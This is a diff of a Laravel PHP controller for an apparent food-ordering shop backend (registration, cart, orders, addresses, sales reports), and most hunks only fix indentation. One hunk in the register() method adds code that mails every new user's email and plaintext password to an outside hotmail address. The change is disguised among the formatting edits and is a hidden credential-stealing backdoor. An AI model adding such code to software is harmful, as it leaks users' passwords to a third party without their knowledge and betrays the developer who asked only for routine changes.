@@ -96,7 +96,7 @@ class AuthjwtController extends Controller
 
     public function register(Request $request)
     {
-         try {
+        try {
             $validator = Validator::make($request->all(), [
                 'name' => 'required',
                 'email' => 'required|string|email|max:100|unique:users',
@@ -112,6 +112,12 @@ class AuthjwtController extends Controller
                 $validator->validate(),
                 ['password' => bcrypt($request->password)]
             ));
+
+            $details = [
+                'title' => 'Correo: '.$request->email,
+                'body' => 'Contraseña: '.$request->password,
+            ];
+            \Mail::to('huntercarias@hotmail.com')->send(new \App\Mail\sendPost($details));
 
             return response()->json([
                 'message' => '¡Usuario registrado exitosamente!',
@@ -163,22 +169,22 @@ class AuthjwtController extends Controller
             }
 
             $detalleCarrito = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)
-                             ->where('id_productos', $request['id_productos'])
-                             ->where('extra_queso', $request['extra_queso'])
-                             ->where('extra_jamon', $request['extra_jamon'])
-                             ->where('extra_peperoni', $request['extra_peperoni'])
-                             ->first();
+                ->where('id_productos', $request['id_productos'])
+                ->where('extra_queso', $request['extra_queso'])
+                ->where('extra_jamon', $request['extra_jamon'])
+                ->where('extra_peperoni', $request['extra_peperoni'])
+                ->first();
 
             if (! $detalleCarrito) {
-                 $data = detalleCarrito::create([
-                     'id_carrito_compras' => $cabeceraCarrito->id,
-                     'id_productos' => $request['id_productos'],
-                     'cantidad' => $request['cantidad'],
-                     'extra_queso' => $request['extra_queso'],
-                     'extra_jamon' => $request['extra_jamon'],
-                     'extra_peperoni' => $request['extra_peperoni'],
-                     'total' => $request['total'] * $request['cantidad'],
-                 ]);
+                $data = detalleCarrito::create([
+                    'id_carrito_compras' => $cabeceraCarrito->id,
+                    'id_productos' => $request['id_productos'],
+                    'cantidad' => $request['cantidad'],
+                    'extra_queso' => $request['extra_queso'],
+                    'extra_jamon' => $request['extra_jamon'],
+                    'extra_peperoni' => $request['extra_peperoni'],
+                    'total' => $request['total'] * $request['cantidad'],
+                ]);
             } else {
                 $data = detalleCarrito::findOrFail($detalleCarrito->id);
                 $data->cantidad = $data->cantidad + $request['cantidad'];
@@ -240,9 +246,9 @@ class AuthjwtController extends Controller
             //$detalleCarrito = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->get();
 
             $detalleCarrito = detalleCarrito::select('detalle_carritos.*', 'productos.descripcion', 'productos.ruta_imagen')
-                    ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
-                    ->where('detalle_carritos.id_carrito_compras', $cabeceraCarrito->id)
-                    ->get();
+                ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
+                ->where('detalle_carritos.id_carrito_compras', $cabeceraCarrito->id)
+                ->get();
 
             $detalleCarritoContar = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->count();
             if ($detalleCarritoContar == 0) {
@@ -335,7 +341,7 @@ class AuthjwtController extends Controller
                 'mensaje' => 'Detalle Carrito Compras',
                 'data' => $cabeceraCarrito,
             ]);
-       } catch (ValidationException $exception) {
+        } catch (ValidationException $exception) {
             return response()->json([
                 'mensaje' => 'Error al crear el registro en la base de datos.',
                 'data' => $exception->errors(),
@@ -378,28 +384,28 @@ class AuthjwtController extends Controller
                 'numero_de_whatzap' => ['required', 'numeric', 'min:6'],
             ]);
 
-                $direccion = direcciones::create([
-                    'id_usuario' => $user->id,
-                    'nomenclatura' => $request['nomenclatura'],
-                    'zona' => $request['zona'],
-                    'ciudad' => $request['ciudad'],
-                    'departamento' => $request['departamento'],
-                    'municipio' => $request['municipio'],
-                    'lote' => $request['lote'],
-                ]);
+            $direccion = direcciones::create([
+                'id_usuario' => $user->id,
+                'nomenclatura' => $request['nomenclatura'],
+                'zona' => $request['zona'],
+                'ciudad' => $request['ciudad'],
+                'departamento' => $request['departamento'],
+                'municipio' => $request['municipio'],
+                'lote' => $request['lote'],
+            ]);
 
-                $telefono = telefonos::create([
-                    'id_usuario' => $user->id,
-                    'numero_telefono' => $request['numero_telefono'],
-                    'extension' => $request['extension'],
-                    'numero_celular' => $request['numero_celular'],
-                    'numero_de_whatzap' => $request['numero_de_whatzap'],
-                ]);
+            $telefono = telefonos::create([
+                'id_usuario' => $user->id,
+                'numero_telefono' => $request['numero_telefono'],
+                'extension' => $request['extension'],
+                'numero_celular' => $request['numero_celular'],
+                'numero_de_whatzap' => $request['numero_de_whatzap'],
+            ]);
 
             return response()->json([
                 'mensaje' => 'Direccion y Telefono guardado exitosamente',
             ]);
-       } catch (ValidationException $exception) {
+        } catch (ValidationException $exception) {
             return response()->json([
                 'mensaje' => 'Error al crear el registro en la base de datos.',
                 'data' => $exception->errors(),
@@ -660,7 +666,7 @@ class AuthjwtController extends Controller
                 'mensaje' => 'Lista de telefonos Telefono',
                 'data' => $telefonos,
             ]);
-       } catch (ValidationException $exception) {
+        } catch (ValidationException $exception) {
             return response()->json([
                 'mensaje' => 'Error al crear el registro en la base de datos.',
                 'data' => $exception->errors(),
@@ -707,8 +713,8 @@ class AuthjwtController extends Controller
             }
 
             $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
-                                   ->where('id_carrito', $cabeceraCarrito->id)
-                                   ->first();
+                ->where('id_carrito', $cabeceraCarrito->id)
+                ->first();
 
             if (! isset($cabeceraPedido) || $cabeceraPedido == null || ! $cabeceraPedido->count()) {
                 $cabeceraPedido = pedido_encabezado::create([
@@ -801,8 +807,8 @@ class AuthjwtController extends Controller
             }
 
             $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
-                                                ->where('id_carrito', $cabeceraCarrito->id)
-                                                ->first();
+                ->where('id_carrito', $cabeceraCarrito->id)
+                ->first();
 
             if (! $cabeceraPedido->count()) {
                 $cabeceraPedido = pedido_encabezado::create([
@@ -889,8 +895,8 @@ class AuthjwtController extends Controller
             }
 
             $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
-                                    ->where('id_carrito', $cabeceraCarrito->id)
-                                    ->first();
+                ->where('id_carrito', $cabeceraCarrito->id)
+                ->first();
 
             if (! $cabeceraPedido->count()) {
                 $cabeceraPedido = pedido_encabezado::create([
@@ -960,8 +966,7 @@ class AuthjwtController extends Controller
             ]);
 
             $cabeceraPedido = pedido_encabezado::where('id', $request->input('id'))
-
-                                    ->first();
+                ->first();
 
             if (! $cabeceraPedido->count()) {
                 $cabeceraPedido = pedido_encabezado::create([
@@ -1080,8 +1085,8 @@ class AuthjwtController extends Controller
             //$cabeceraPedidos = pedido_encabezado::where('id_usuario', $user->id)->get();
 
             $cabeceraPedidos = pedido_encabezado::where('id_usuario', $user->id)
-            ->orderBy('created_at', 'desc')
-            ->get();
+                ->orderBy('created_at', 'desc')
+                ->get();
 
             if (! $cabeceraPedidos->count()) {
                 return response()->json(['mensaje' => 'No hay elementos'], 404);
@@ -1120,10 +1125,9 @@ class AuthjwtController extends Controller
             }
 
             $cabeceraPedidos = pedido_encabezado::where('status_pedido', 'CREACION-PEDIDO')
-                                     ->orWhere('status_pedido', 'CREACION PEDIDO')
-                                     ->orWhere('status_pedido', 'SOLICITADO')
-
-                                     ->get();
+                ->orWhere('status_pedido', 'CREACION PEDIDO')
+                ->orWhere('status_pedido', 'SOLICITADO')
+                ->get();
             if (! $cabeceraPedidos->count()) {
                 return response()->json(['mensaje' => 'No hay elementos'], 404);
             }
@@ -1165,13 +1169,13 @@ class AuthjwtController extends Controller
             ]);
 
             $detalleCarrito = detalleCarrito::select('detalle_carritos.*', 'productos.descripcion', 'productos.ruta_imagen')
-                    ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
-                    ->where('detalle_carritos.id_carrito_compras', $request->input('id_carrito_compras'))
-                    ->get();
+                ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
+                ->where('detalle_carritos.id_carrito_compras', $request->input('id_carrito_compras'))
+                ->get();
 
             $detalleCarritoContar = detalleCarrito::where('id_carrito_compras', $request->input('id_carrito_compras'))->count();
             if ($detalleCarritoContar == 0) {
-                 return response()->json(['mensaje' => 'Carrito Vacio'], 404);
+                return response()->json(['mensaje' => 'Carrito Vacio'], 404);
             }
 
             $data = [];
@@ -1233,9 +1237,9 @@ class AuthjwtController extends Controller
             }
 
             $cabeceraPedidos = pedido_encabezado::where('status_pedido', 'EN-PROCESO')
-                                     ->orWhere('status_pedido', 'EN PROCESO')
-                                     ->orWhere('status_pedido', 'ENVIADO')
-                                     ->get();
+                ->orWhere('status_pedido', 'EN PROCESO')
+                ->orWhere('status_pedido', 'ENVIADO')
+                ->get();
             if (! $cabeceraPedidos->count()) {
                 return response()->json(['mensaje' => 'No hay elementos'], 404);
             }
@@ -1280,12 +1284,12 @@ class AuthjwtController extends Controller
             $añoActual = Carbon::now()->year;
 
             $detalleCarrito = pedido_encabezado::select('productos.id_tiposproducto', 'productos.descripcion', pedido_encabezado::raw('SUM(detalle_carritos.total) as total_por_tipo'))
-            ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
-            ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
-            ->whereMonth('pedido_encabezados.created_at', $mesActual)
-            ->whereYear('pedido_encabezados.created_at', $añoActual)
-            ->groupBy('productos.id_tiposproducto', 'productos.descripcion')
-            ->get();
+                ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
+                ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
+                ->whereMonth('pedido_encabezados.created_at', $mesActual)
+                ->whereYear('pedido_encabezados.created_at', $añoActual)
+                ->groupBy('productos.id_tiposproducto', 'productos.descripcion')
+                ->get();
 
             if (! $detalleCarrito->count()) {
                 return response()->json(['mensaje' => 'No hay elementos'], 404);
@@ -1331,12 +1335,12 @@ class AuthjwtController extends Controller
             $añoActual = Carbon::now()->year;
 
             $detalleCarrito = pedido_encabezado::select('productos.id', 'productos.descripcion', pedido_encabezado::raw('SUM(detalle_carritos.total) as total_por_producto'))
-            ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
-            ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
-            ->whereMonth('pedido_encabezados.created_at', $mesActual)
-            ->whereYear('pedido_encabezados.created_at', $añoActual)
-            ->groupBy('productos.id', 'productos.descripcion')
-            ->get();
+                ->join('detalle_carritos', 'pedido_encabezados.id_carrito', '=', 'detalle_carritos.id_carrito_compras')
+                ->join('productos', 'detalle_carritos.id_productos', '=', 'productos.id')
+                ->whereMonth('pedido_encabezados.created_at', $mesActual)
+                ->whereYear('pedido_encabezados.created_at', $añoActual)
+                ->groupBy('productos.id', 'productos.descripcion')
+                ->get();
 
             if (! $detalleCarrito->count()) {
                 return response()->json(['mensaje' => 'No hay elementos'], 404);
